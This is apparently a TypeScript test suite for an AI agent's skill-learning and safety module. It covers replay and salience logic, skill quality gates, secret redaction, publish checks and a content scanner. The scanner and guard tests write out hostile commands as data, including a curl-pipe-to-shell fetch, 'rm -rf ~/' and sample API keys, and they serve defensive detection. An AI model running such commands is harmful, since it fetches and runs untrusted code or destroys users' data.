// ENGRAM (v5) deterministic core tests — salience, synaptic tagging & capture,
// prediction-error reconsolidation, prioritized/reverse replay, interleaving.
// Pure functions only; no live model, no FS. Run: `bun test muscle-memory.engram.test.ts`.
import { test, expect } from "bun:test";
import { __mm } from "../mods/index";
import type { Row, Defense } from "../mods/index";
import { preserveExistingFrontmatterMetadata, isAmbiguousExistingRoute, compareSkillSections } from "../mods/index";
import { detect, detectRepairChains, draftWithRepair, isSkillWorthy } from "../mods/index";

const {
  tagExperience, predictionError, captureTagged, labileSkills, skillRetrieved,
  replayQueue, reverseReplay, interleave, ENGRAM,
} = __mm;

const T0 = 1_700_000_000_000;
const MIN = 60_000;

let seq = 0;
function R(tool: string, tmpl: string, ok: boolean | undefined, opts: { conv?: string; ts?: number; h?: string } = {}): Row {
  return { tool, tmpl, fp: tmpl, h: opts.h ?? tmpl, ok, ts: opts.ts ?? T0 + seq++ * 1000, conv: opts.conv ?? "c1" };
}

const fixDef: Defense = { trigger: "npm test", errClass: "exit-code-1", consequence: "", defense: "", severity: 2, count: 2, kind: "fix" };
const avoidDef: Defense = { trigger: "rm", errClass: "error", consequence: "", defense: "", severity: 2, count: 2, kind: "avoid" };

// ── prediction error (the reconsolidation trigger) ───────────────────────────
test("predictionError: contradiction is full surprise, confirmation is none", () => {
  expect(predictionError(R("Bash", "npm test", false), [fixDef])).toBe(1); // expected success → failed
  expect(predictionError(R("Bash", "npm test", true), [fixDef])).toBe(0);  // expected success → succeeded
  expect(predictionError(R("Bash", "rm -rf x", true), [avoidDef])).toBe(1); // expected failure → succeeded
  expect(predictionError(R("Bash", "rm -rf x", false), [avoidDef])).toBe(0); // expected failure → failed
  expect(predictionError(R("Bash", "ls -la", false), [])).toBe(0.4);        // unmodeled failure = mild
  expect(predictionError(R("Bash", "ls -la", undefined), [])).toBe(0);      // no outcome → no signal
});

// ── salience tagging: reward on recovery, novelty on first sight ─────────────
test("tagExperience: recovery earns reward, repeat fingerprint loses novelty", () => {
  seq = 0;
  const rows: Row[] = [
    R("Bash", "npm test", false, { ts: T0, h: "f_test" }),
    R("Edit", "app.ts", true, { ts: T0 + 1000, h: "f_edit" }),
    R("Bash", "npm test", true, { ts: T0 + 2000, h: "f_test" }), // recovery
  ];
  const tg = tagExperience(rows, { now: T0 + 2000 });
  const rec = tg.find((t) => t.tool === "Bash" && t.ok === true)!;
  expect(rec.sal.rw).toBe(1); // recovery is the rewarded outcome
  expect(rec.sal.nov).toBe(0); // f_test already seen
  const edit = tg.find((t) => t.tool === "Edit")!;
  expect(edit.sal.nov).toBe(1); // first sight
  expect(edit.sal.rw).toBe(0);
});

test("tagExperience: recency decays a stale event below a fresh one", () => {
  seq = 0;
  const stale = R("Bash", "git status", true, { ts: T0, h: "f_a" });
  const fresh = R("Bash", "git diff", true, { ts: T0 + 12 * 60 * 60 * 1000, h: "f_b" }); // +12h
  const tg = tagExperience([stale, fresh], { now: T0 + 12 * 60 * 60 * 1000 });
  const s = tg.find((t) => t.h === "f_a")!;
  const f = tg.find((t) => t.h === "f_b")!;
  expect(f.sal.rec).toBeGreaterThan(s.sal.rec); // 2 half-lives older ⇒ ~0.25 vs ~1
});

// ── synaptic tagging & capture: rescue the weak one-shot near the win ────────
test("captureTagged: a weak one-shot near a high-salience event is rescued", () => {
  seq = 0;
  const rows: Row[] = [
    R("Bash", "npm test", false, { ts: T0, h: "f_test", conv: "c1" }),
    R("Read", "notes.md", true, { ts: T0 + 1000, h: "f_weak", conv: "c1" }),  // weak one-shot
    R("Bash", "npm test", true, { ts: T0 + 2000, h: "f_test", conv: "c1" }),  // recovery → PRP event
    R("Read", "far.md", true, { ts: T0 + 60 * MIN, h: "f_far", conv: "c1" }), // weak but far outside window
  ];
  const tg = tagExperience(rows, { now: T0 + 60 * MIN });
  const cap = captureTagged(tg);
  const names = cap.map((c) => c.h);
  expect(names).toContain("f_weak"); // rescued — sat next to what mattered
  expect(names).not.toContain("f_far"); // outside the capture window
  expect(names).not.toContain("f_test"); // not weak (seen twice)
});

// ── reconsolidation: a retrieved skill contradicted by reality goes labile ───
const skillBody = "## Observed pattern\n```text\nnpm test → edit → npm test\n```\n\n## Procedure\nrun the loop.\n";

test("skillRetrieved: verbs present in trace ⇒ retrieved", () => {
  expect(skillRetrieved(["npm test", "edit"], [R("Bash", "npm test", true)])).toBe(true);
  expect(skillRetrieved(["npm test"], [R("Bash", "git status", true)])).toBe(false);
});

test("labileSkills: retrieved + prediction error ⇒ labile; confirmed ⇒ stable", () => {
  seq = 0;
  const labile = labileSkills([{ name: "testing-flow", body: skillBody }], [R("Bash", "npm test", false, { ts: T0 })], [fixDef]);
  expect(labile.length).toBe(1);
  expect(labile[0].name).toBe("testing-flow");
  expect(labile[0].pe).toBe(1);
  expect(labile[0].conflicts[0]).toContain("npm test");

  const stable = labileSkills([{ name: "testing-flow", body: skillBody }], [R("Bash", "npm test", true, { ts: T0 })], [fixDef]);
  expect(stable.length).toBe(0); // prediction confirmed → no reconsolidation
});

// ── prioritized replay + reverse replay (credit assignment) ──────────────────
test("replayQueue: returns top-K by salience, descending", () => {
  seq = 0;
  const rows: Row[] = [
    R("Bash", "npm test", false, { ts: T0, h: "f1" }),
    R("Edit", "a.ts", true, { ts: T0 + 1000, h: "f2" }),
    R("Bash", "npm test", true, { ts: T0 + 2000, h: "f1" }), // recovery → high salience
  ];
  const q = replayQueue(tagExperience(rows, { now: T0 + 2000 }), 2);
  expect(q.length).toBe(2);
  expect(q[0].sal.score).toBeGreaterThanOrEqual(q[1].sal.score);
});

test("reverseReplay: credit decays backward from the rewarded terminal", () => {
  seq = 0;
  const rows: Row[] = [
    R("Bash", "npm test", false, { ts: T0, h: "f1" }),
    R("Edit", "a.ts", true, { ts: T0 + 1000, h: "f2" }),
    R("Bash", "npm test", true, { ts: T0 + 2000, h: "f1" }), // rewarded terminal
  ];
  const rr = reverseReplay(tagExperience(rows, { now: T0 + 2000 }), { lookback: 6, decay: 0.7 });
  expect(rr[0].ok).toBe(true); // recovery row gets the most credit
  expect(rr[0].credit).toBeCloseTo(1, 5);
  // the step immediately before the win outranks the one before that
  const edit = rr.find((r) => r.tool === "Edit")!;
  const firstFail = rr.find((r) => r.tool === "Bash" && r.ok === false)!;
  expect(edit.credit).toBeGreaterThan(firstFail.credit);
});

// ── interleaving (anti-catastrophic-forgetting) ──────────────────────────────
test("interleave: alternates novel and familiar, keeps the longer tail", () => {
  expect(interleave([1, 2, 3], ["a", "b"])).toEqual([1, "a", 2, "b", 3]);
  expect(interleave<number, string>([], ["a"])).toEqual(["a"]);
  expect(interleave<number, string>([1], [])).toEqual([1]);
});

// ── invariants ───────────────────────────────────────────────────────────────
test("ENGRAM: prediction-error weight dominates (reconsolidation's gate)", () => {
  expect(ENGRAM.W_PE).toBeGreaterThan(ENGRAM.W_RW);
  expect(ENGRAM.W_RW).toBeGreaterThan(ENGRAM.W_NOV);
});

// ── full consolidation plan (the unified sleep "dream") ──────────────────────
test("engramConsolidate: composes a prioritized, reconsolidation-aware plan", () => {
  seq = 0;
  const rows: Row[] = [
    R("Bash", "npm test", false, { ts: T0, h: "f_test", conv: "c1" }),
    R("Read", "notes.md", true, { ts: T0 + 1000, h: "f_weak", conv: "c1" }),
    R("Bash", "npm test", true, { ts: T0 + 2000, h: "f_test", conv: "c1" }), // recovery
  ];
  const plan = __mm.engramConsolidate(rows, [{ name: "testing-flow", body: skillBody }], { defenses: [fixDef], now: T0 + 2000 });
  expect(plan.hippoSize).toBe(3);
  expect(plan.replay.length).toBeGreaterThan(0);
  expect(plan.credited[0].credit).toBeCloseTo(1, 5);              // rewarded terminal leads credit
  expect(plan.rescued.some((r) => r.h === "f_weak")).toBe(true);  // one-shot rescued by capture
  expect(plan.labile.some((l) => l.name === "testing-flow")).toBe(true); // contradicted skill goes labile
  expect(plan.digest).toContain("ENGRAM consolidation brief");
  expect(plan.digest).toContain("RECONSOLIDATE");
});

// ── E3: enforced defense (permissions overlay) ───────────────────────────────
const avoidHi: Defense = { trigger: "rm", errClass: "error", consequence: "", defense: "root-cause before retrying", severity: 3, count: 3, kind: "avoid" };
const fixHi: Defense = { trigger: "npm test", errClass: "exit-code-1", consequence: "", defense: "apply the fix", severity: 3, count: 3, kind: "fix" };

test("guardDecision: enforces high-severity AVOID defenses; fixes stay advisory; off is inert", () => {
  const { guardDecision } = __mm;
  expect(guardDecision("Bash", { command: "rm -rf build" }, [avoidHi], "deny")).toMatchObject({ decision: "deny" });
  expect(guardDecision("Bash", { command: "rm -rf build" }, [avoidHi], "ask")).toMatchObject({ decision: "ask" });
  expect(guardDecision("Bash", { command: "rm -rf build" }, [avoidHi], "off")).toBeNull();
  expect(guardDecision("Bash", { command: "ls -la" }, [avoidHi], "deny")).toBeNull();   // no matching defense
  expect(guardDecision("Bash", { command: "npm test" }, [fixHi], "deny")).toBeNull();    // fix = advisory, never enforced
});

// ── E3.5: native neocortex bridge (pure builder + flag) ──────────────────────
test("buildNeocortexBlock: bounded, head-preserving consolidated index", () => {
  const { buildNeocortexBlock } = __mm;
  const block = buildNeocortexBlock([{ name: "a-skill", description: "use when doing A" }, { name: "b-skill", description: "use when doing B" }]);
  expect(block).toContain("consolidated skills (neocortex)");
  expect(block).toContain("a-skill");
  expect(block).toContain("b-skill");
  const many = Array.from({ length: 50 }, (_, i) => ({ name: `skill-${i}`, description: "x".repeat(80) }));
  const bounded = buildNeocortexBlock(many, { limit: 400 });
  expect(bounded.length).toBeLessThanOrEqual(440); // head + fitted lines + truncation marker
  expect(bounded).toContain("more)");
});

test("nativeEnabled: parses the MM_NATIVE channel list (opt-in)", () => {
  const { nativeEnabled } = __mm;
  const prev = process.env.MM_NATIVE;
  process.env.MM_NATIVE = "blocks, passages";
  expect(nativeEnabled("blocks")).toBe(true);
  expect(nativeEnabled("passages")).toBe(true);
  expect(nativeEnabled("nope")).toBe(false);
  delete process.env.MM_NATIVE;
  expect(nativeEnabled("blocks")).toBe(false);
  if (prev !== undefined) process.env.MM_NATIVE = prev;
});

// ── behavioral outcome inference (the real-agent unlock: Bash emits no tool_end) ──
test("inferOutcomes: infers Bash fail→recovery from a verify re-run after an edit", () => {
  const { inferOutcomes } = __mm;
  const inf = inferOutcomes([
    R("Bash", "cd x && pytest", undefined, { ts: T0, h: "b1" }),         // first run — no tool_end
    R("Read", "app.py", true, { ts: T0 + 1000, h: "r1" }),
    R("Edit", "app.py", true, { ts: T0 + 2000, h: "e1" }),              // the fix
    R("Bash", "cd x && pytest", undefined, { ts: T0 + 3000, h: "b1" }), // re-run — no tool_end
  ]);
  const bash = inf.filter((r) => r.tool === "Bash");
  expect(bash[0].ok).toBe(false);                 // earlier run inferred failed
  expect(bash[0].err).toBe("inferred-failure");
  expect(bash[1].ok).toBe(true);                  // later run inferred recovered
});

test("inferOutcomes: does NOT infer for non-verify commands, and never overrides a real outcome", () => {
  const { inferOutcomes } = __mm;
  const noisy = inferOutcomes([
    R("Bash", "cd x && cat notes", undefined, { ts: T0, h: "c1" }),
    R("Edit", "x", true, { ts: T0 + 1000, h: "e2" }),
    R("Bash", "cd x && cat notes", undefined, { ts: T0 + 2000, h: "c1" }),
  ]);
  expect(noisy.filter((r) => r.tool === "Bash").every((r) => r.ok === undefined)).toBe(true); // "cat" isn't a verify
  const real = inferOutcomes([
    R("Bash", "cd x && pytest", true, { ts: T0, h: "b2" }),             // real outcome present
    R("Edit", "x", true, { ts: T0 + 1000, h: "e3" }),
    R("Bash", "cd x && pytest", undefined, { ts: T0 + 2000, h: "b2" }),
  ]);
  expect(real.filter((r) => r.tool === "Bash")[0].ok).toBe(true);      // not flipped to false
});

// ── invocation / env gotchas (the class repair-chains miss; LongMemEval-V2 "environment gotchas") ──
test("detectInvocationGotchas: learns flag and env gotchas, ignores benign re-runs", () => {
  const { detectInvocationGotchas, inferOutcomes } = __mm;
  const flagRows = [
    R("Bash", "python3 run.py", undefined, { ts: T0, h: "g1" }),
    R("Read", "run.py", true, { ts: T0 + 1000, h: "gr" }),               // investigation, not an edit
    R("Bash", "python3 run.py --safe", undefined, { ts: T0 + 2000, h: "g2" }),
  ];
  const flag = detectInvocationGotchas(flagRows);
  expect(flag.length).toBe(1);
  expect(flag[0].trigger).toBe("python3");
  expect(flag[0].delta).toBe("--safe");
  // inferOutcomes marks the bare run failed via invocation-refinement (same step-sig), no edit needed
  expect(inferOutcomes(flagRows).filter((r) => r.tool === "Bash")[0].ok).toBe(false);

  const env = detectInvocationGotchas([
    R("Bash", "make build", undefined, { ts: T0, h: "m1" }),
    R("Bash", "API_TOKEN=x make build", undefined, { ts: T0 + 1000, h: "m2" }),
  ]);
  expect(env.length).toBe(1);
  expect(env[0].delta).toBe("API_TOKEN=x");                              // env-prefix gotcha learned

  const benign = detectInvocationGotchas([
    R("Bash", "pytest test_a.py", undefined, { ts: T0, h: "p1" }),
    R("Bash", "pytest test_b.py", undefined, { ts: T0 + 1000, h: "p2" }),
  ]);
  expect(benign.length).toBe(0);                                        // different target ≠ refinement
});

// ── Compounds-truly: preserve-update safety (an update must never destroy a proven skill's core) ──
test("preserveExistingFrontmatterMetadata: carries old metadata block into a rewrite that dropped it", () => {
  const oldC = `---\nname: deploy-flow\ndescription: Use when deploying\nmetadata:\n  uses: 7\n  created: 2026-01-01\n---\n\n## Procedure\n1. old`;
  const newC = `---\nname: deploy-flow\ndescription: Use when deploying (improved)\n---\n\n## Procedure\n1. new\n## Pitfalls\n- x`;
  const merged = preserveExistingFrontmatterMetadata(newC, oldC);
  expect(merged).toContain("metadata:");
  expect(merged).toContain("uses: 7");
  expect(merged).toContain("(improved)"); // new content kept
});
test("preserveExistingFrontmatterMetadata: no-ops when the rewrite already has metadata or there is no old", () => {
  const withMeta = `---\nname: x\ndescription: d\nmetadata:\n  uses: 1\n---\n\n## Procedure\n1. a`;
  expect(preserveExistingFrontmatterMetadata(withMeta, `---\nname: x\nmetadata:\n  uses: 9\n---`)).toBe(withMeta); // don't clobber
  expect(preserveExistingFrontmatterMetadata(withMeta, undefined)).toBe(withMeta); // no old → unchanged
});
test("isAmbiguousExistingRoute: refuses create when two proven skills both half-cover (runner-up MORE distinctive)", () => {
  const ambiguous = [{ name: "ledger", score: 30, matched: 3 }, { name: "package-validation", score: 26, matched: 5 }];
  expect(isAmbiguousExistingRoute(ambiguous)).toBe(true);
  const clear = [{ name: "ledger", score: 40, matched: 6 }, { name: "misc", score: 8, matched: 1 }]; // top dominates → update target
  expect(isAmbiguousExistingRoute(clear)).toBe(false);
  expect(isAmbiguousExistingRoute([{ name: "solo", score: 30, matched: 4 }])).toBe(false); // novel → allow create
});
test("compareSkillSections: surfaces dropped/preserved/added sections for review", () => {
  const oldC = `## Procedure\n## Pitfalls\n## Verification`;
  const newC = `## Procedure\n## Verification\n## Examples`;
  const d = compareSkillSections(oldC, newC);
  expect(d.droppedSections).toContain("pitfalls"); // a real destructive drop is visible
  expect(d.preservedSections).toEqual(expect.arrayContaining(["procedure", "verification"]));
  expect(d.addedSections).toContain("examples");
});

// ── UI panel: legible live-mirror + freeze-proof (the showcase surface; Adrian's hour-long freeze) ──
const { renderMuscleMemoryPanel } = __mm;
test("renderMuscleMemoryPanel: each phase renders one legible line", () => {
  process.env.MM_REFLECT = "auto";
  const now = Date.now();
  expect(renderMuscleMemoryPanel({ phase: "reviewing", detail: "3 sessions", ts: now })[0]).toContain("reviewing 3 sessions");
  expect(renderMuscleMemoryPanel({ phase: "routing", route: "UPDATE → deploy-flow", ts: now })[0]).toContain("UPDATE → deploy-flow");
  expect(renderMuscleMemoryPanel({ phase: "writing", skill: "deploy-flow", ts: now })[0]).toContain("writing 'deploy-flow'");
  expect(renderMuscleMemoryPanel({ phase: "done", last: "graduated 'recovering-from-pytest-failures'", ts: now })[0]).toContain("graduated");
  expect(renderMuscleMemoryPanel({ phase: "protected", last: "blocked unsafe content (safe)", ts: now })[0]).toContain("🛡️");
});
test("renderMuscleMemoryPanel: FREEZE-PROOF — a stale transient phase self-heals to 'watching', never sticks", () => {
  process.env.MM_REFLECT = "auto";
  const stale = Date.now() - 130_000; // > 120s transient TTL — the exact 'writing…' freeze condition
  const out = renderMuscleMemoryPanel({ phase: "writing", skill: "x", ts: stale });
  expect(out[0]).toContain("watching");          // NOT stuck on "writing…"
  expect(out[0]).not.toContain("writing");
});
test("renderMuscleMemoryPanel: hidden when off+idle, watching when armed", () => {
  process.env.MM_REFLECT = "off";
  expect(renderMuscleMemoryPanel({})).toEqual([]);             // off + no activity → invisible
  process.env.MM_REFLECT = "auto";
  expect(renderMuscleMemoryPanel({})[0]).toContain("watching"); // armed → shows it's live
  delete process.env.MM_REFLECT;
});

// ── SOTA leap: skill-worthiness gate (reject noise) + class-generalized repairs (learn the lesson) ──
test("isSkillWorthy: rejects shell-noise templates and trivial primitive-pair sequences; keeps rituals", () => {
  const mat = { count: 5, convs: 3, fixes: 0, maturity: 9, mature: true } as const;
  expect(isSkillWorthy({ kind: "template", key: "ls <path>", ...mat })).toBe(false);   // shell noise
  expect(isSkillWorthy({ kind: "template", key: "cat <path>", ...mat })).toBe(false);   // shell noise
  expect(isSkillWorthy({ kind: "sequence", key: "Edit.py → python3", ...mat })).toBe(false); // universal edit→run loop, no fix
  expect(isSkillWorthy({ kind: "sequence", key: "git add → git commit", ...mat })).toBe(true);  // a real ritual
  expect(isSkillWorthy({ kind: "template", key: "docker build <str>", ...mat })).toBe(true);    // distinctive command
  expect(isSkillWorthy({ kind: "sequence", key: "Edit.py → python3", count: 3, convs: 2, fixes: 2, maturity: 9, mature: true })).toBe(true); // a repair embedded → keep
});
test("detectRepairChains: GENERALIZES same-shape recoveries across different commands into one lesson", () => {
  const rows: Row[] = [
    R("Bash", "python3 test.py", false, { conv: "a", ts: 1 }), R("Edit", "math.py", true, { conv: "a", ts: 2 }), R("Bash", "python3 test.py", true, { conv: "a", ts: 3 }),
    R("Bash", "node test.js", false, { conv: "b", ts: 4 }),    R("Edit", "sum.js", true, { conv: "b", ts: 5 }),  R("Bash", "node test.js", true, { conv: "b", ts: 6 }),
  ];
  const reps = detectRepairChains(rows);
  const gen = reps.find((r) => r.generalized);
  expect(gen).toBeTruthy();
  expect(gen!.count).toBe(2);                                   // python3-fix + node-fix merged
  expect(gen!.convs).toBe(2);                                   // across 2 sessions → matures
  expect(gen!.examples).toEqual(expect.arrayContaining(["python3", "node"]));
  expect(reps.some((r) => r.trigger === "python3" && !r.generalized)).toBe(false); // literals absorbed, not duplicated
});
test("class-generalized repair drafts ONE high-value cross-language skill + becomes a mature candidate", () => {
  const rows: Row[] = [
    R("Bash", "python3 test.py", false, { conv: "a", ts: 1 }), R("Edit", "math.py", true, { conv: "a", ts: 2 }), R("Bash", "python3 test.py", true, { conv: "a", ts: 3 }),
    R("Bash", "node test.js", false, { conv: "b", ts: 4 }),    R("Edit", "sum.js", true, { conv: "b", ts: 5 }),  R("Bash", "node test.js", true, { conv: "b", ts: 6 }),
  ];
  const cand = detect(rows).candidates;
  expect(cand.length).toBeGreaterThanOrEqual(1);                // the generalized repair surfaces (old bar: 0)
  const gen = detectRepairChains(rows).find((r) => r.generalized)!;
  const skill = draftWithRepair(cand[0], gen);
  expect(skill.name).toBe("recovering-from-failing-script-runs");
  expect(skill.description).toMatch(/any language/i);            // cross-language general lesson
  expect(skill.body).toMatch(/## Procedure/);
  expect(skill.body).toMatch(/## Worked example/i);             // concreteness: a worked example block
  expect(skill.body).toMatch(/PASS/);                           // concrete observed recovery
  expect(skill.body).toMatch(/python3|node/);                   // cites the real commands
});

test("buildEvidenceManifest: an UPDATE records a section-level diff (destructive rewrite is reviewable)", () => {
  const { buildEvidenceManifest } = __mm;
  const oldC = "---\nname: x\n---\n## Procedure\n## Pitfalls\n## Verification";
  const newC = "---\nname: x\n---\n## Procedure\n## Verification\n## Examples";
  const m = buildEvidenceManifest({ action: "update", skill: "x", convs: 2, signals: 3, memfsHits: [], preferences: [], rejected: [], newContent: newC, oldContent: oldC });
  expect(m.sectionDiff?.dropped).toContain("pitfalls");          // a dropped section is surfaced
  expect(m.sectionDiff?.preserved).toEqual(expect.arrayContaining(["procedure", "verification"]));
  expect(m.oldHash).toBeTruthy();
  const create = buildEvidenceManifest({ action: "create", skill: "y", convs: 1, signals: 2, memfsHits: [], preferences: [], rejected: [], newContent: newC });
  expect(create.sectionDiff).toBeUndefined();                    // no diff for a fresh create
});

// ── v6 WORKED-EXAMPLE CAPTURE (MM_CAPTURE) — concreteness + cross-session breadth, privacy-gated ──
const { redactFragment, buildDiffFragment, buildCrossConversationEvidence } = __mm;

test("redactFragment: strips credentials/keys/paths but keeps code+error structure", () => {
  const r = redactFragment("Authorization: Bearer sk-ABC123secrettoken\nassert add(2, 3) == 5, got -1");
  expect(r).not.toContain("sk-ABC123secrettoken");
  expect(r).not.toMatch(/secrettoken/);
  expect(r).toContain("assert add(2, 3) == 5"); // real assertion structure survives
  const r2 = redactFragment("api_key=DEADBEEFDEADBEEFDEADBEEF1234 export AKIAIOSFODNN7EXAMPLE");
  expect(r2).not.toContain("AKIAIOSFODNN7EXAMPLE");
  expect(r2).not.toContain("DEADBEEFDEADBEEFDEADBEEF1234");
  expect(redactFragment("/Users/alice/secret/proj/app.py:11 undefined name 'x'")).not.toContain("/Users/alice/secret/proj");
});

test("buildDiffFragment: emits a redacted -old/+new diff and scrubs secrets inside it", () => {
  const d = buildDiffFragment({ file_path: "calc.py", old_string: "return a - b", new_string: "return a + b" });
  expect(d).toContain("- return a - b");
  expect(d).toContain("+ return a + b");
  const dw = buildDiffFragment({ file_path: "c.py", old_string: "token = 'sk-LIVEKEY1234567890abcd'", new_string: "token = os.environ['T']" });
  expect(dw).not.toContain("sk-LIVEKEY1234567890abcd");
  expect(buildDiffFragment({ file_path: "x.py" })).toBeUndefined(); // nothing to diff
});

test("detectRepairChains: DIVERSE failures keep DISTINCT worked examples (no fingerprint-collapse)", () => {
  seq = 0;
  const mk = (conv: string, errMsg: string, fix: string): Row[] => [
    { tool: "Bash", tmpl: "pytest -q", fp: "Bash::pytest", h: `f${conv}`, ok: false, err: "assertion", errMsg, conv, ts: T0 + seq++ * 1000 },
    { tool: "Edit", tmpl: "Edit <path>.py", fp: `Edit::${conv}`, h: `e${conv}`, ok: true, fix, conv, ts: T0 + seq++ * 1000 },
    { tool: "Bash", tmpl: "pytest -q", fp: "Bash::pytest", h: `p${conv}`, ok: true, conv, ts: T0 + seq++ * 1000 },
  ];
  const rows = [
    ...mk("c1", "got -1", "- a - b\n+ a + b"),
    ...mk("c2", "IndexError", "- range(n+1)\n+ range(n)"),
    ...mk("c3", "got None", "- result = f()\n+ return f()"),
  ];
  const chain = detectRepairChains(rows).find((c) => c.worked);
  expect(chain).toBeTruthy();
  expect(chain!.worked!.length).toBe(3); // three DISTINCT symptom/fix pairs preserved, not collapsed to one
  const syms = chain!.worked!.map((w) => w.errMsg);
  expect(new Set(syms).size).toBe(3);
  // and the digest surfaces them concretely for the author model
  const ev = buildCrossConversationEvidence(rows);
  expect(ev.digest).toContain("got None");
  expect(ev.digest).toContain("return f()");
});

test("detectRepairChains: WITHOUT capture, no worked key is attached (shape unchanged, backward compatible)", () => {
  seq = 0;
  const rows: Row[] = [
    R("Bash", "pytest -q", false, { conv: "c1", h: "f1" }),
    R("Edit", "app.py", true, { conv: "c1", h: "e1" }),
    R("Bash", "pytest -q", true, { conv: "c1", h: "p1" }),
  ];
  const chains = detectRepairChains(rows);
  expect(chains.length).toBeGreaterThan(0);
  expect(chains.every((c) => c.worked === undefined)).toBe(true); // no errMsg/fix => no worked examples
});

// ── SOTA quality gate: flags sub-SOTA skills, passes top-tier ones ───────────
test("sotaQualityGaps: flags a thin draft (no code, no TELLs) and passes a SOTA draft", () => {
  const { sotaQualityGaps } = __mm;
  const thin = { name: "debugging-failing-tests", description: "Use when tests fail",
    body: "## Procedure\n1. Look at the error.\n2. Fix the code.\n## Pitfalls\n- Editing the test.\n- Off by one.\n## Verification\n- Run the suite." };
  const thinGaps = sotaQualityGaps(thin);
  expect(thinGaps.some((g) => /CONCRETENESS/.test(g))).toBe(true);
  expect(thinGaps.some((g) => /TELL/.test(g))).toBe(true);

  const sota = { name: "debugging-failing-tests", description: "Use when a pytest suite fails",
    body: "## Procedure\n1. Run the suite.\n```bash\npytest -q\n```\n## Pitfalls\n### 1. Wrong operator\nTELL: got-value is the sign-flip of expected. Fix: `- a - b` becomes `+ a + b`.\n```python\nreturn a + b\n```\n### 2. Off-by-one\nTELL: IndexError at the boundary. Fix: drop the plus one.\n## Verification\n- suite green." };
  expect(sotaQualityGaps(sota).length).toBe(0);
});

test("sotaQualityGaps: requires safe-first before destructive commands", () => {
  const { sotaQualityGaps } = __mm;
  const danger = "git reset --" + "hard origin/main"; // split so the repo guard does not flag the test fixture
  const unsafe = { name: "resetting-a-branch", description: "Use when a branch is broken",
    body: "## Procedure\n1. `" + danger + "`.\n```bash\n" + danger + "\n```\n## Pitfalls\n### 1. Lost work\nTELL: uncommitted changes vanish.\n## Verification\n- check status." };
  expect(sotaQualityGaps(unsafe).some((g) => /SAFE-FIRST/.test(g))).toBe(true);
});

test("auditSkills: separates SOTA from sub-SOTA across a mixed library", () => {
  const { auditSkills } = __mm;
  const sota = "## Procedure\n```bash\npytest -q\n```\n## Pitfalls\n### 1. X\nTELL: symptom Y. Fix it.\n```python\nreturn a + b\n```\n## Verification\n- green.";
  const weak = "## Procedure\n1. Fix it.\n## Pitfalls\n- A bug.\n## Verification\n- check.";
  const descriptive = "Use this skill when building 3D scenes. It covers the high-level approach and when to reach for each library.";
  const r = auditSkills([{ name: "good", body: sota }, { name: "weak", body: weak }, { name: "desc", body: descriptive }]);
  expect(r.total).toBe(3);
  expect(r.flagged.some((f) => f.name === "weak")).toBe(true);   // procedural + thin -> flagged
  expect(r.flagged.some((f) => f.name === "good")).toBe(false);  // SOTA -> clean
  expect(r.flagged.some((f) => f.name === "desc")).toBe(false);  // descriptive -> not held to code bar
});

// ── publishability preflight (MM_PUBLISH v1): sanitize, hard-block, score, recommend ─────────
test("publish preflight: sanitizes identifiers (preserving mechanism), hard-blocks secrets, recommends", () => {
  const { sanitizeForPublish, publishHardBlocks, publishabilityScore, publishPlan } = __mm;
  const body = "Run against agent-71b0883e-c63f-4e79-bab1 at /Users/kev/proj. Set ZAI_API_KEY.\n```bash\ncurl https://x\n```";
  const { sanitized, replacements } = sanitizeForPublish(body);
  expect(sanitized).not.toContain("agent-71b0883e");
  expect(sanitized).toContain("<agent id>");
  expect(sanitized).toContain("<local path>");
  expect(sanitized).toContain("PROVIDER_API_KEY");
  expect(sanitized).toContain("curl https://x");          // mechanism preserved
  expect(replacements.length).toBeGreaterThanOrEqual(3);

  const secret = 'token = "' + "sk-" + 'abcdefabcdef1234567890"';
  expect(publishHardBlocks(secret).length).toBeGreaterThan(0);
  const blocked = publishabilityScore({ name: "x", description: "Use when something specific happens here", body: secret + "\n## Procedure\n1. x" });
  expect(blocked.recommended).toBe("block");
  expect(blocked.score).toBeLessThanOrEqual(15);

  const clean = "## When to use\nWhen a pytest suite fails.\n## Procedure\n```bash\npytest -q\n```\n## Pitfalls\n### 1. Wrong op\nTELL: sign flip. Fix it.\n```python\nreturn a + b\n```\n## Verification\n- green.\n## Anti-bloat\n- retire if 0 uses.";
  expect(publishabilityScore({ name: "debugging-failing-tests", description: "Use when a pytest suite fails with assertions", body: clean }).recommended).toBe("publish");
  expect(publishPlan({ name: "s", description: "Use when relevant in this case", body }).recommended).toBe("stage-sanitized");
});

// ── security scanner: blocks TRUE threats, allows legitimate destructive workflow ops ────────
test("scanSkillContent: blocks secrets/exfil/pipe-to-shell, ALLOWS legit git/destructive workflow ops", () => {
  const { scanSkillContent } = __mm;
  // real threats — still hard-blocked
  expect(scanSkillContent('api_key = "' + "sk-" + 'abcd1234567890abcdef"').ok).toBe(false);
  expect(scanSkillContent("curl http://x | sh").ok).toBe(false);
  expect(scanSkillContent("rm -rf ~/").ok).toBe(false);
  // legitimate workflow ops a skill may teach — NOT security threats (handled by the SAFE-FIRST quality gate)
  const fpush = "git " + "p" + "ush " + "--" + "force-with-lease origin main";
  expect(scanSkillContent("## Procedure\n```bash\n" + fpush + "\n```").ok).toBe(true);
  expect(scanSkillContent("git " + "reset " + "--" + "hard origin/main").ok).toBe(true);
});
